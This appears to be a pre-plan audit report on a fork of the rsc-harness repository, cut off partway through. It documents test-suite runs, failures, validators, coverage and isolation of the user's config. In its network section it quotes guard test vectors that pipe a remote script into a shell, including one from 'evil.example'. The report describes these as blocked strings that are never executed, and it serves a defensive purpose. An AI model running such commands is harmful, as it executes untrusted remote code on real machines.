# Audit Track D — tests, deterministic validators and semantic evaluations

**Stage 0 pre-plan audit.** Repository `ericrisco/rsc-harness`, working clone
`/Users/home/Development/rsc-harness-fork`, pinned at base commit
`6f7edd31d109b7f0211d637e2d084724f6dd8e26` (release 3.7.1, commit subject
`🔖 chore(release): 3.7.1 [skip ci]`).

Authority for this track: `docs/fork/REQUIREMENTS.md` sections 1 (isolation rules), 3 (fact /
inference distinction), 9 (manual maintenance) and 11 (validation and evaluation budget).
**The plan is not approved.** Everything below stays inside what section 1 permits before
approval: read-only inspection, a dependency install local to the clone, and running the
existing tests.

Evidence in this report is partitioned three ways, as sections 1 and 3 both require:

| Label | Meaning |
|---|---|
| **[EXECUTED]** | A command was run in this audit. The exact command and its real output summary are given. |
| **[INFERRED]** | Established by reading code or data. Not executed. |
| **[NOT VERIFIED]** | Deliberately not run, or not completed. The reason is recorded. |

---

## 0. Isolation actually used, and the attestation about the real `~/.claude`

**[EXECUTED]** Every process in this track ran with `HOME` and the assistant/XDG config
variables redirected into the clone, and with credential variables unset. The exact prefix used
for every run was:

```
cd /Users/home/Development/rsc-harness-fork && \
env -u GITHUB_TOKEN -u NPM_TOKEN -u ANTHROPIC_API_KEY -u GH_TOKEN \
    -u ANTHROPIC_AUTH_TOKEN -u CLAUDE_CODE_OAUTH_TOKEN \
  HOME="$PWD/.fork-tmp/home" \
  XDG_CONFIG_HOME="$PWD/.fork-tmp/home/.config" \
  XDG_DATA_HOME="$PWD/.fork-tmp/home/.local/share" \
  XDG_CACHE_HOME="$PWD/.fork-tmp/home/.cache" \
  CLAUDE_CONFIG_DIR="$PWD/.fork-tmp/home/.claude" \
  npm_config_cache="$PWD/.fork-tmp/npm-cache" \
  <command>
```

No authentication to any service was performed. No global install was performed
(`npm i -g` and `npm link` were never run).

### The real `~/.claude` was not created or modified

**[EXECUTED]** Verified by mtime comparison, without reading the directory's contents:

| Moment | `stat -f "%m %Sm" ~/.claude` |
|---|---|
| Before any run in this track | `1793495013  Oct 31 19:03:33 2026` |
| After the install, the full suite, all validators and the re-runs | `1793495013  Oct 31 19:03:33 2026` |

Identical, to the second. `~/.claude` was neither created (it already existed) nor modified.

**The isolation was not decorative — it caught real writes.** **[EXECUTED]** After the runs,
the redirected home contained:

```
.fork-tmp/home/.rsc/memslop-offer.json
.fork-tmp/home/.rsc/automation-gaps.md
```

Those two files are what the harness writes into `$HOME/.rsc` during tests. Without the
redirection they would have landed in the user's real `~/.rsc`. **[EXECUTED]** The real
`~/.rsc` exists independently (mtime `1793413678`, Oct 30 20:27:58 2026 — predating this
audit) and its mtime was unchanged by these runs.

**[EXECUTED]** `git status --porcelain` is empty: no tracked file in the clone was modified.
Writes were confined to `.fork-tmp/` and this file under `docs/fork/audit/`.

**Incidental finding, relevant to section 1 of the requirements.** **[EXECUTED]**
`git check-ignore -v docs/fork/REQUIREMENTS.md` resolves to `.gitignore:30:docs/`. The whole
`docs/` tree is gitignored upstream, so `docs/fork/` **cannot be committed as-is**. Section 1
requires the first implementation commit to include `docs/fork/`, so the fork must add a
negation (`!docs/fork/`) or move the location. `.fork-tmp/` is excluded via
`.git/info/exclude:7` (local, not committed).

---

## A. Results observed by execution

### A1. Dependency install

**[EXECUTED]** Exact command (with the isolation prefix from section 0):

```
npm install --no-audit --no-fund
```

| Item | Result |
|---|---|
| Outcome | **Success** |
| Duration | **2.33 s** real (1.65 s user, 1.11 s sys), measured with `/usr/bin/time -p` |
| Packages added | **91** (`added 91 packages in 2s`) |
| Top-level `node_modules` entries | 67 |
| Warnings | **1 deprecation**: `npm warn deprecated glob@10.5.0: Old versions of glob are not supported, and contain widely publicized security vulnerabilities…` |
| Notices | `npm notice New major version of npm available! 10.9.8 -> 12.2.1` (informational) |
| Vulnerabilities | **[NOT VERIFIED]** — `--no-audit` was used, as prescribed. `npm audit` needs the npm registry, which section 1 classifies as an external service. Not run. |

**[EXECUTED]** Resolved versions: `ajv 8.20.0`, `@iarna/toml 2.2.5`, `c8` present and
executable at `node_modules/.bin/c8`. `package-lock.json` declares 91 `resolved` entries,
matching the install count.

**[EXECUTED]** `node_modules` **is** gitignored: `.gitignore` line 2 (`node_modules/`), and
again at line 34. Confirmed by reading `.gitignore`.

### A2. Full existing test suite

**[EXECUTED]** Exact command (with the isolation prefix from section 0):

```
node --test
```

`package.json` declares `"test": "node --test"`, so this is the suite as upstream defines it.

| Metric | Value (verbatim from the TAP summary) |
|---|---|
| `# tests` | **1537** |
| `# pass` | **1497** |
| `# fail` | **39** |
| `# skipped` | **1** |
| `# cancelled` | 0 |
| `# todo` | 0 |
| `# suites` | 0 |
| `# duration_ms` | **8215493.80** → **8215.5 s ≈ 2 h 16 m 55 s** |
| Process exit code | **1** |

The run exceeded the 600 s foreground limit and was completed in the background; the full TAP
log is at `.fork-tmp/test-run.log` (9,447+ lines). Nothing hung: the run terminated on its own
and emitted a complete `1..1537` plan.

**Network.** **[EXECUTED + INFERRED]** No test performs network I/O. Five test files contain
URL-shaped strings; all five were read and all are inert:
`tests/apply.test.js:820`, `tests/danger-guard.test.js:119` and
`tests/onboarding-cli.test.js:281` use `curl https://x.sh | bash` and
`curl -s https://evil.example/x.sh | sh` as **test vectors a guard must block** — strings
asserted against, never executed; `tests/clone-bootstrap.test.js:640,660` likewise; and
`tests/team-safe-default.test.js:402` sets a git remote to
`https://example.invalid/x.git` (a reserved non-resolvable TLD) that is never fetched.
`tests/auto-update.test.js` — the one area that would plausibly reach a registry — **stubs it
completely**: it injects a fake `npx` via `RSC_AUTO_UPDATE_CMD` and the "latest version" via
`RSC_LATEST` (`tests/auto-update.test.js:25-44,158-161`). No test needs credentials, and none
was declined on that basis.

**Writes outside the clone — an honest deviation to record.** **[EXECUTED]** 98 of the 136
test files build their scratch projects with `os.tmpdir()` / `mkdtempSync`, so the suite writes
into the OS temp directory (observed paths of the form
`/var/folders/d9/n0csg2ts0dl10w3gchx_scgr0000gn/T/rsc-ks-…`), i.e. **outside** the dedicated
`.fork-tmp/` folder. `TMPDIR` was not redirected. This is scratch state in a per-user temp
area, not the user's assistant configuration, and 0 test files reference `homedir()` directly.
Still, a stricter reading of section 1 would have had `TMPDIR` pointed inside `.fork-tmp/` too;
a re-run under that constraint is **[NOT VERIFIED]**.

#### The one skipped test

**[EXECUTED]** `tests/danger-guard.test.js` — *"the materialized copy of the guard has not
drifted from the source"*, reported as:

```
ok 348 - the materialized copy of the guard has not drifted from the source # SKIP
  no .rsc/danger-guard.mjs in this checkout (gitignored install state) — nothing to drift
```

A deliberate, self-documenting conditional skip: `.rsc/` is gitignored, so in a clean clone
there is no materialized guard to compare. Legitimate.

#### The 39 failures, grouped by file

**[EXECUTED]** Parsed from the TAP `location:` field of each `not ok`:

| File | Failures |
|---|---|
| `tests/knowledge-sync.test.js` | **24** |
| `tests/auto-update.test.js` | **6** |
| `tests/eval-lint.test.js` | **3** |
| `tests/deepseek-target.test.js` | **2** |
| `tests/apply.test.js` | 1 |
| `tests/design-engine.test.js` | 1 |
| `tests/ftd-close.test.js` | 1 |
| `tests/vsl-sales-pack.test.js` | 1 |
| **Total** | **39** |

Full failing test names (verbatim): `ks02`–`ks18`, `ks30`, `ks44`, `ks45`, `ks48`, `ks49`,
`ks50`, `ks52`, `ks53`, `ks61`, `ks63` (knowledge-sync); *"a minor in the same major installs
itself, at that exact version, for every declared target"*, *"a patch installs itself too"*,
*"the next session says once that it was updated, then stays quiet"*, *"a failed update is
retried after a day"*, *"a newer release than the failed one is tried at once"*, *"run by an
agent with no hook, the module updates and says so in plain text"* (auto-update);
*"eval-lint: a route_to naming a skill that does not exist FAILS the build"*, *"eval-lint:
\"none\" and \"external:<name>\" are accepted, bare \"external:\" is not"*, *"eval-lint: every
target in a multi-value route_to is checked"*; `dsh04`, `dsh06` (deepseek-target);
*"session-start: two scopes in one session emit the always-on body exactly once"* (apply);
*"A5 · the browser gate fails a known-bad page by name and passes the corrected one"*
(design-engine); `fc08` (ftd-close); *"VSL pack installs through existing multi-add and stays
discoverable after refresh"* (vsl-sales-pack).

#### Root causes established for three of the groups

**1. The 3 `eval-lint` failures are an isolation artefact — confirmed by execution.**
Each asserts `0 !== 1`: the gate was expected to exit 1 and exited 0. Cause:
`scripts/eval-lint.sh` does its real validation in an inline `python3` heredoc that needs
PyYAML, and falls back to a **SKIP that exits 0** when `import yaml` fails. **[EXECUTED]**

```
$ python3 -c "import yaml; print(yaml.__file__)"
/Users/home/Library/Python/3.13/lib/python/site-packages/yaml/__init__.py

$ HOME="$PWD/.fork-tmp/home" python3 -c "import yaml"
ModuleNotFoundError: No module named 'yaml'
```

PyYAML lives in a **HOME-dependent user site-packages** directory, so redirecting `HOME`
removes it. This is caused by the isolation, not by upstream code — **but it exposes a real
governance defect regardless** (see A4, `eval-lint`): the gate **fails open**.

**2. The 24 `knowledge-sync` failures are load-induced timeouts — mechanism identified.**
Every one fails downstream of the same thing: the `rsc/knowledge` branch was never created, so
the assertion helper dies with
`Command failed: git ls-tree -r --name-only rsc/knowledge / fatal: Not a valid object name rsc/knowledge`.
**[INFERRED, from `targets/knowledge-sync.mjs:65-88`]** every local git call in the sync worker
runs under `LOCAL_TIMEOUT_MS = 4_000` (4 s) and returns a soft `!ok` on timeout rather than
throwing. **[EXECUTED]** the full suite ran with 107 concurrent `node` processes on this
machine, and the failing `ks` tests reported `duration_ms` of ~61,000 each — consistent with
stacked timeouts, not with logic errors. `ks01`, which exercises the same push path, **passed**.
Note the suite also does **not** stub git identity globally — but that is not the cause:
`tests/knowledge-sync.test.js:59-60` sets `user.name`/`user.email` per repository.

**3. The 6 `auto-update` failures are timing-sensitive.** **[INFERRED, from
`tests/auto-update.test.js:86`]** the tests wait on a background process with a fixed
`waitFor(join(p.root, 'never'), 300)` — a 300 ms budget, which a saturated machine misses.

### A3. Serial re-run of the 8 failing files — separating real defects from contention

**[EXECUTED]** To distinguish genuine failures from artefacts of running 136 files in parallel,
the eight failing files were re-run **one test at a time** under the same isolation:

```
node --test --test-concurrency=1 \
  tests/knowledge-sync.test.js tests/auto-update.test.js tests/eval-lint.test.js \
  tests/deepseek-target.test.js tests/apply.test.js tests/design-engine.test.js \
  tests/ftd-close.test.js tests/vsl-sales-pack.test.js
```

| Metric | Value |
|---|---|
| `# tests` | **166** (all tests in those 8 files) |
| `# pass` | **155** |
| `# fail` | **11** |
| `# skipped` | 0 |
| `# duration_ms` | **1636059.49** → **1636 s ≈ 27 m 16 s** |

**28 of the 39 failures disappeared** when concurrency was removed. Comparison per file:

| File | Failures in parallel run | Failures serial | Verdict |
|---|---|---|---|
| `tests/knowledge-sync.test.js` | 24 | **6** | 18 were contention |
| `tests/auto-update.test.js` | 6 | **0** | **all 6 were contention** (confirms the 300 ms `waitFor`) |
| `tests/eval-lint.test.js` | 3 | **3** | reproducible — confirmed isolation artefact (PyYAML) |
| `tests/deepseek-target.test.js` | 2 | **1** | 1 contention; `dsh06` reproducible |
| `tests/apply.test.js` | 1 | **0** | contention |
| `tests/design-engine.test.js` | 1 | **1** | reproducible |
| `tests/ftd-close.test.js` | 1 | **0** | contention |
| `tests/vsl-sales-pack.test.js` | 1 | **0** | contention |
| **Total** | **39** | **11** | |

#### The 11 that reproduce, and what is actually established about them

- **3 × `eval-lint`** — **confirmed isolation artefact**, mechanism proven by execution in A2
  (PyYAML lives under the real `HOME`). Not an upstream defect, but it exposes the fail-open
  defect described in A4.
- **6 × `knowledge-sync`** (`ks30`, `ks44`, `ks48`, `ks54`, `ks61`, `ks63`) — **reproducible
  under reduced concurrency, cause NOT isolated.** **[EXECUTED]** serially **45 of the 51
  numbered `ks` cases pass** (against 27 of 51 in the parallel run); `dsh` went 5 pass / 1 fail
  and every `fc` case in `ftd-close` passed 8/8. Their failure modes still carry the timeout
  signature: `ks44` fails with
  `Command failed: git show rsc/knowledge:02-DOCS/wiki/index.md / fatal: invalid object name 'rsc/knowledge'`
  (the branch was never created), `ks63` asserts on an empty string where it expected
  `fresco.md`, `ks30` sees a `user_message` where it expected silence. Decisively, their
  per-test durations **stayed at 48–62 s even at `--test-concurrency=1`**, against the
  `LOCAL_TIMEOUT_MS = 4_000` ceiling on every local git call. **[NOT VERIFIED]** whether these
  are genuine upstream defects: this serial re-run was itself partly contended — the ten
  validators in A4 were executed while it was in flight — and the tests remain intrinsically
  fragile on a slow filesystem. They must not be reported as upstream bugs on this evidence.
- **1 × `deepseek-target` `dsh06`** ("end to end: dsh's SessionStart reaches the installed
  memory hook through the bridge") — reproducible; assertion
  `"the session was captured in the project journal, under dsh's session id"` was false. Cause
  not isolated. **[NOT VERIFIED]** as an upstream defect.
- **1 × `design-engine` `A5`** ("the browser gate fails a known-bad page by name and passes the
  corrected one") — fails with
  `ENOENT: … /T/rsc-design-gate-qLAauk/bad/report.json` after 35 s.
  **[INFERRED, and most likely an isolation artefact.]** This is the one test in the suite that
  **drives a real Chrome-family browser over the Chrome DevTools Protocol**
  (`tests/design-engine.test.js:56-62` imports `findChrome` from
  `skills/design/engine/scripts/lib/cdp.mjs` and skips if Node < 22 or no browser is found).
  **[EXECUTED]** on this machine `node -v` is `v22.22.3` and `findChrome()` resolves to
  `/Applications/Google Chrome.app/Contents/MacOS/Google Chrome`, so the test did **not** skip
  — it launched the user's Chrome binary under a redirected `HOME`, where Chrome has no
  writable profile/user-data directory, and produced no `report.json`. The test's own comment is
  notable: *"a skipped gate must never read as a green one"* — it deliberately fails rather than
  skips. The fork should be aware this test requires a local browser; under section 1 it is the
  only test in the suite with an external-program dependency.

**Net conclusion for the fork:** of 39 observed failures, **28 are concurrency artefacts** and
**3 are a proven artefact of the required isolation**. The remaining **8 reproduce but are not
attributable to upstream defects on this evidence**, and 6 of those 8 still show the 4-second
git-timeout signature. The honest headline is therefore: **the suite has no confirmed upstream
failure, but it is not reliable under load, and it is far too slow (2 h 17 m) to serve as a
maintenance gate without work.**

### A4. Deterministic validators — every one executed

**[EXECUTED]** Before running any of them, each script was read to confirm it needs no
credentials, no network and no write outside the clone. Findings from that reading:
`build-manifest.js` and `routing-audit.js` touch no subprocess and no network;
`drift-check.js` calls `homedir()` only to locate a memory directory (redirected here);
`knowledge-doctor.js` and `spec-gate.js` shell out to **local `git`** only
(`git cat-file -e`, `git rev-parse`); `originality-check.js` runs `git rev-parse` **only on its
`--refresh <checkout>` path**, which was not used — the default path reads a precomputed
fingerprint file (`schema/ecc-originality.u64`). The URL in `originality-check.js:107` is a
provenance string in generated metadata, not a fetch. **No validator was declined.**

Durations are wall-clock, measured around each invocation. Note that `drift:knowledge`,
`knowledge:doctor` and `spec:gate` all operate on `02-DOCS/`, which is gitignored upstream and
therefore **absent from a clean clone** — their "pass" is vacuous here.

| Command | What it checks | Executed? | Exit | Duration | Governance-conformance value |
|---|---|---|---|---|---|
| `npm run manifest:check` | `manifest.json` is current — regenerates and diffs the catalogue index (skills, agents, commands) | **Yes** | **0** | 2.1 s | **High.** The catalogue census itself. Output: `manifest OK (274 skills, 34 agents, 53 commands)`. Natural place to assert a per-skill governance contract (every skill carries the block, digest, provenance). Needs extending: today it checks presence/consistency, not conformance. |
| `npm run validate` | Frontmatter against `schema/frontmatter.schema.json`; skill-body code-fence delimiters balanced; description-weight report | **Yes** | **0** | 1.0 s | **High.** Already a per-skill structural gate over all 274. Output: `frontmatter OK`, `skill bodies OK (code-block delimiters balanced)`, `description weight: 104.8 KB across 274 skills (mean 392 chars) · 139 over the 350-char ceiling` (soft, non-blocking). The obvious host for "every distributed skill satisfies the governance contract". |
| `npm run drift:check` | Every **prose** markdown link in the catalogue resolves (code-fenced/inline-code links are shown, not followed) | **Yes** | **0** | 5.7 s | **High.** Output: `886 prose link claim(s) checked, 4 classified as non-claims` / `RESULT: PASS`. Directly covers section 11's "references". Must be extended to the fork's new reference class (`02-DOCS/wiki/skills/<name>/README.md`), which it does not know about. |
| `npm run drift:knowledge` | Same, report-only, over the private knowledge tree plus inline-code paths | **Yes** | **0** | 2.9 s | **Low as-is.** Output: `skipped — no knowledge tree found (02-DOCS/wiki and auto-memory are both absent)`. Vacuous in a clean clone; becomes meaningful only against a fixture that has a wiki. |
| `npm run knowledge:doctor` | Reports wiki claims that no longer hold; never writes | **Yes** | **0** | 5.9 s | **Low as-is.** Output: `knowledge-doctor: no hay 02-DOCS/wiki/ — nada que auditar.` Report-only by design and deliberately outside CI and hooks. Relevant to the fork only when run against brownfield fixtures. |
| `npm run spec:gate` | Runs the `specify` exit gate over written specs; report-only, never edits | **Yes** | **0** | 1.0 s | **Low as-is.** Output: `no specs found — pass a path, or write one to 02-DOCS/wiki/sdd/specs/`. Deliberately not in `prepublishOnly` because specs live under the untracked `02-DOCS/`. |
| `npm run routing:audit` | Ranks all `should_trigger`/`should_not_trigger` prompts through the real `consult.js` ranker against declared floors | **Yes** | **1** | 11.7 s | **Very high — and it is RED at the base commit.** See below. |
| `npm run originality:check` | 8-gram SHA-256 fingerprints of agents/commands vs a precomputed third-party corpus; fails closed on collision | **Yes** | **0** | 1.6 s | **Medium.** Output: `originality OK (82 documents vs 93337 corpus fingerprints; 0 exemptions)`. Licence/originality hygiene; unchanged by governance work, but it gates `prepublishOnly` and the release workflow, so the fork must keep it green. |
| `bash scripts/eval-lint.sh` *(CI-only, not an npm script)* | Per skill: ≥5 `should_trigger`, ≥4 `should_not_trigger`, ≥1 `capability`, and every `route_to` resolves | **Yes** | **0** | 20.7 s | **High in principle, FAILS OPEN in practice.** See below. |
| `bash scripts/reviewer-guard.sh` *(not in CI, not an npm script)* | Asserts every `rsc-review` reviewer agent still carries its confidence-filtering sections | **Yes** | **1** | 0.1 s | **None at this commit.** Output: `reviewer-guard: agents dir not found: …/plugins/rsc-review/agents`. **[EXECUTED]** `plugins/` does not exist in the repo — the guard is vestigial and permanently red. |

#### `routing:audit` fails at the pinned base commit

**[EXECUTED]** Verbatim:

```
routing-audit: 274 skills · 3169 prompts
positive recall: rank-1 44.7% · top-3 63.9% · top-5 70.0%
negative owner-at-1: 4.3% · declared route top-5 84.9% · route beats owner 87.2%
…
FAIL: declared-route top-5 84.9% < 85%
```

**[INFERRED, `scripts/routing-audit.js:11-17`]** the floors are
`rank1: 44`, `top5: 70`, `routedTop5: 85`, `maxNegativeSelfRank1: 6`, `maxCollision: 0.80`.
The run sits **0.1 pp under** the `routedTop5` floor while clearing every other floor by a hair
(44.7 vs 44, 70.0 vs 70). **This is a pre-existing upstream failure, not something the fork
introduced** — and it is red precisely because `routing:audit` is **not wired into CI**
(see A4 note below). The fork inherits a validator that is both the most relevant to section
11's "invocation routes" and currently failing. It also reports description-overlap pressure:
`0.74 linkedin-carousels ↔ linkedin-content`, `0.69 expo ↔ react-native`,
`0.66 youtube-api ↔ youtube-strategy`, `0.64 code-review ↔ review` — against a
`maxCollision` of 0.80. Adding a uniform governance block to 274 descriptions could move these
numbers, so the fork must treat `routing:audit` as a regression gate from day one.

#### `eval-lint.sh` fails open — a governance defect independent of the isolation

**[EXECUTED]** Under the redirected `HOME`:

```
scanned 274 skill(s); 0 failure(s)
WARNING: deep YAML validation was skipped for one or more skills (python3 or PyYAML unavailable).
RESULT: PASS
```

All 274 skills printed
`SKIP: python3/yaml unavailable — structural keys present, deep validation skipped`, and the
script still **exited 0**. The gate that CI relies on to prove "every `route_to` resolves" and
"every skill has a capability scenario" degrades to a no-op whenever PyYAML is missing, and
announces that only as a warning. On `ubuntu-latest` with `actions/setup-node` and no Python
dependency step, PyYAML's presence is an accident of the runner image. **For the fork this must
become a hard failure**, and the check should move into the Node validators so it has no Python
dependency at all.

#### Which validators CI actually runs

**[EXECUTED]** From `.github/workflows/ci.yml` and `release.yml`:

| Validator | In `ci.yml` | In `release.yml` | In `prepublishOnly` |
|---|---|---|---|
| `validate` | yes | yes | yes |
| `manifest:check` | yes | yes | — (`manifest` is) |
| `npm test` | yes | **yes** (`release.yml:56`) | — |
| `eval-lint.sh` | yes | yes | — |
| `drift:check` | yes | via `prepublishOnly` | yes |
| `originality:check` | — | yes | yes |
| `routing:audit` | **no** | **no** | **no** |
| `drift:knowledge`, `knowledge:doctor`, `spec:gate` | **no** | **no** | **no** |
| `reviewer-guard.sh` | **no** | **no** | **no** |

`ci.yml` also runs a grep-based "cleanup gate" against retired marketplace fingerprints.
`npm publish` in `release.yml:108` triggers `prepublishOnly`, which is how `drift:check` and
`originality:check` reach the release path.

**The consequence for the fork is sharp:** the release path gates on **`npm test`**, which this
audit measured at **2 h 16 m 55 s** with **39 failures under parallel load**. Every monthly
maintenance run in section 9 has to pass through that. Making the suite fast and load-stable is
not housekeeping — it is a precondition for section 9 being usable at all.

### A5. Coverage

**[NOT VERIFIED] Full-suite `npm run coverage` was deliberately time-boxed out.**
`package.json` defines `"coverage": "c8 --reporter=text node --test"` — i.e. c8 over the
*entire* suite, which this audit measured at **2 h 16 m 55 s uninstrumented**. c8 adds
instrumentation overhead on top, and the run would have to be repeated to be trusted given the
load sensitivity documented in A3. A whole-catalogue coverage percentage is therefore **not
reported**. This is stated rather than estimated.

**[EXECUTED] Instead, c8 was run twice over the files this fork will actually modify.**

#### Run 1 — installer, targets and manifest

```
./node_modules/.bin/c8 --reporter=text \
  --include='scripts/install-apply.js' --include='targets/index.js' \
  --include='scripts/build-manifest.js' --include='scripts/lib/manifest*.js' \
  node --test tests/apply.test.js tests/base-install.test.js tests/target-resolution.test.js \
    tests/manifest.test.js tests/manifest-file.test.js tests/frontmatter.test.js \
    tests/capabilities.test.js
```

Exit 0 · **371 s** · `# tests 139`, `# pass 139`, `# fail 0` (a further confirmation that
`apply.test.js`'s single failure in A2 was contention).

| File | % Stmts | % Branch | % Funcs | % Lines | Uncovered lines |
|---|---|---|---|---|---|
| **All files (this subset)** | **80.73** | **61.39** | **76.19** | **80.73** | |
| `targets/index.js` (188 lines) | **98.40** | 67.74 | **100** | 98.40 | 24, 29–30 |
| `scripts/lib/manifest-file.js` | **98.52** | 66.66 | **100** | 98.52 | 52 |
| `scripts/lib/manifest.js` | 88.88 | 88.88 | 66.66 | 88.88 | 12–13 |
| `scripts/install-apply.js` (1,048 lines) | **79.19** | **57.46** | 74.35 | 79.19 | …–985, 993–1002, 1008–1009, 1046–1048 |
| `scripts/build-manifest.js` | 60.52 | 80.95 | **33.33** | 60.52 | 18–19, 79–89, 95–103, 112–119, 121–150 |

#### Run 2 — knowledge sync

**[NOT VERIFIED — time-boxed and cancelled.]** The command was launched and ran for **over
50 minutes without completing**, at which point it was stopped:

```
./node_modules/.bin/c8 --reporter=text --include='targets/knowledge-sync.mjs' \
  node --test tests/knowledge-sync.test.js
```

For comparison, the same file **uninstrumented** took 27 m 16 s on its own (A3), so c8 roughly
doubles it. **No coverage figure for `targets/knowledge-sync.mjs` (1,026 lines) is reported.**

This is itself a finding the fork must act on: the single most fork-relevant runtime file — the
one that owns `02-DOCS` synchronisation — is **effectively not measurable for coverage** at the
current test speed. The cause is structural, not accidental: `tests/knowledge-sync.test.js`
drives thousands of real `git` subprocesses across a bare remote and two-to-three clones per
test, under a 4-second internal timeout. Until that file is made faster or split, coverage for
knowledge sync cannot be part of any gate.

#### What the numbers mean for the fork

- **`targets/index.js` is the best-covered fork-critical file (98.4 % statements, 100 %
  functions).** That matters: it is the installer's fan-out — real skill files live once under
  `.rsc/skills/<id>/` and each assistant gets a relative symlink (a copy on Windows, because
  directory symlinks need Developer Mode there). If the governance strategy is an
  overlay/transformation at install time, this is where it lands, and the existing tests will
  catch regressions.
- **Branch coverage is the weak axis everywhere** — 61.4 % overall and **57.5 % on
  `install-apply.js`**, the single largest fork-critical file. A governance transformation adds
  precisely new *branches* (customisation present / absent / unreadable / contradictory), so the
  fork will be adding code to the least-covered dimension of the least-covered file. Branch
  coverage, not statement coverage, is the number to hold a threshold against.
- **`build-manifest.js`'s 33 % function coverage understates reality.** Its `--check` and
  `--validate` modes are exercised by the npm validators (both executed, exit 0 in A4), not by
  these unit tests. The gap is real nonetheless: the CLI entry paths (lines 121–150) are covered
  by *no test*, only by CI invoking the binary.
- c8 writes its output to `coverage/` inside the clone, which `.gitignore:35` already ignores;
  **[EXECUTED]** `git status --porcelain` stayed empty throughout.

---

## B. Findings established by reading (inferences)

### B1. Test inventory and shape

**[EXECUTED]** `tests/` holds **137 entries**: **136 test files** (all `*.test.js`) plus one
directory, `tests/fixtures/`. Total **22,525 lines**, and **1,492 `test(...)` declarations**
extracted statically — which expand to the 1,537 executed cases.

**[INFERRED]** Classification of all 136 files (every file assigned; counts sum to 136):

| Class | Files | Representative members |
|---|---|---|
| Skill content, behaviour & evals | **33** | `always-on-body`, `always-on-explanation`, `behavior-score`, `eval-integrity`, `eval-lint`, `harden-generalization-gate`, `harden-policy`, `skill-ownership`, `specify-contract`, `specify-doubt`, `ftd-lane`, `ftd-close`, `sello`, `design-engine`, `worktree-reaper`, `refuter-agent`, `refuter-corpus` |
| Installer / `install-apply` / targets | **26** | `apply`, `base-install`, `agent-install`, `agent-overrides`, `agents-md-shadow`, `target-resolution`, `portable-wiring`, `onboarding*` (5), `purge`, `purge-truth`, `repair`, `backups`, `opt-outs`, `single-harness`, `sync-skill-floor`, `default-skill-floor`, `fresh-install-coherence`, `deepseek-target`, `opencode-v2-plugins`, `profile-ownership` |
| CLI / commands / doctor / update | **22** | `rsc-cli`, `cli-usage`, `commands`, `capabilities`, `doctor-exit-code`, `doctor-onboarding-readiness`, `auto-update`, `update-preserves-work`, `update-notice-symptoms`, `bare-command-updates`, `clone-bootstrap`, `consult`, `recommend`, `text-rank`, `detect-repo`, `connect-tool`, `handoff-scripts`, `init-handoff`, `audit`, `result-envelope`, `domains`, `list-skills-symlinks` |
| Manifest / schema / validators | **21** | `manifest`, `manifest-file`, `manifest-divergence`, `manifest-optouts`, `manifest-sharing`, `frontmatter`, `skill-lint`, `drift-check`, `routing-audit`, `originality`, `catalog-counts`, `catalog-diet`, `registry`, `retired-skills`, `public-surface`, `spec-gate`, `spec-gate-subject`, `spec-status-drift`, `gate-honesty`, `gate-honesty-debt`, `import-safe-entrypoints` |
| Memory / privacy / session | **15** | `memory-privacy`, `memory-adapters`, `memory-cross-target`, `memory-integration`, `memory-team-workflow`, `memory-worktree-identity`, `memory-hint-channel`, `session-memory`, `session-start-scope`, `team-clone-memory`, `team-clone-onboarding`, `memslop-offer`, `context-budget`, `repetition`, `reply-language` |
| Hooks / guards | **14** | `hook-idempotency`, `hook-once`, `hooks-path`, `ship-guard-team`, `danger-guard`, `gitmoji-guard`, `copy-guard`, `guard-policy`, `git-permissions`, `shell-unwrap`, `windows-hide`, `edit-count-sees-bash`, `doctor-hook-counts`, `doctor-hook-scripts` |
| Knowledge sync / `02-DOCS` | **5** | `knowledge-sync` (the largest single body of fork-relevant behaviour), `knowledge-doctor`, `ingest-move`, `md-block-fidelity`, `positioning-docs` |

#### Tests that are load-bearing for the fork

**[INFERRED]** Ranked by how directly the fork's governance work will break them:

| Concern | Load-bearing tests |
|---|---|
| **Installer** | `tests/apply.test.js` (largest installer surface: wiring, migration, backups, managed paths), `tests/base-install.test.js`, `tests/target-resolution.test.js`, `tests/portable-wiring.test.js`, `tests/agents-md-shadow.test.js`, `tests/fresh-install-coherence.test.js`. Covering `scripts/install-apply.js` (1,048 lines) and `targets/index.js` (188 lines). |
| **`02-DOCS` / knowledge sync** | `tests/knowledge-sync.test.js` (**128** `02-DOCS` references — by far the densest), `tests/ingest-move.test.js`, `tests/knowledge-doctor.test.js`, `tests/md-block-fidelity.test.js`. Covering `targets/knowledge-sync.mjs` (1,026 lines). |
| **Skill-content conformance** | `tests/frontmatter.test.js`, `tests/skill-lint.test.js`, `tests/catalog-counts.test.js`, `tests/catalog-diet.test.js`, `tests/routing-audit.test.js`, `tests/originality.test.js`, `tests/public-surface.test.js`, `tests/retired-skills.test.js` |
| **Always-on block** | `tests/always-on-body.test.js` (context ceiling, three-lane decisor, "sends a project fact to the wiki, not to the assistant memory"), `tests/always-on-explanation.test.js`; plus 22 more files referencing it (73 references total) |
| **Update / bootstrap** | `tests/auto-update.test.js`, `tests/update-preserves-work.test.js`, `tests/update-notice-symptoms.test.js`, `tests/bare-command-updates.test.js`, `tests/clone-bootstrap.test.js`, `tests/team-clone-onboarding.test.js`, `tests/team-clone-memory.test.js` |
| **Recovery** | `tests/backups.test.js` (snapshot/restore, dry-run, symlinks, path-escape refusal), `tests/repair.test.js` (nested-layout sweep, quadrupled hook entries, dangling links rebuilt from the manifest), `tests/hook-once.test.js` (`claimOnce`), `tests/hook-idempotency.test.js` |
| **Eval machinery itself** | `tests/behavior-score.test.js` (**15** declarations, incl. *"thresholds are 8.5 and 1.0"*), `tests/eval-integrity.test.js` (**28**), `tests/harden-generalization-gate.test.js` (**19**), `tests/harden-policy.test.js`, `tests/eval-lint.test.js` (**5**, of which 3 failed — see A2/A3). For scale: `tests/knowledge-sync.test.js` alone carries **52** declarations. |

#### Fixtures: where they live and what they are

**[EXECUTED]** `tests/fixtures/` holds only **17 files**:

```
behavior-raw-pass.json          refuter-corpus.json        review-panel-run.json
i298-opencode-go-reviewer-3.0.8.md
design-gate/{good,bad}/index.html   design-gate/good/img/p1..p6.png
memory/{claude,codex,cursor,gemini,opencode}-session-start.json
```

**[INFERRED]** These are **data** fixtures (recorded JSON payloads, one HTML good/bad pair, one
captured markdown artefact) — not project fixtures. The real project-fixture idiom is
**procedural**: 98 of 136 files construct a throwaway project with
`mkdtempSync(join(tmpdir(), 'rsc-…'))`. The only other fixture directory in the repo is
`skills/invoicing/scripts/fixtures`, unrelated to testing the harness.

### B2. Semantic evaluation infrastructure — read, not run

**[NOT VERIFIED — deliberately not executed]** Nothing in this subsection was run. Every piece
of it issues model/agent calls, and `skill-harden.workflow.js` additionally **commits to git**
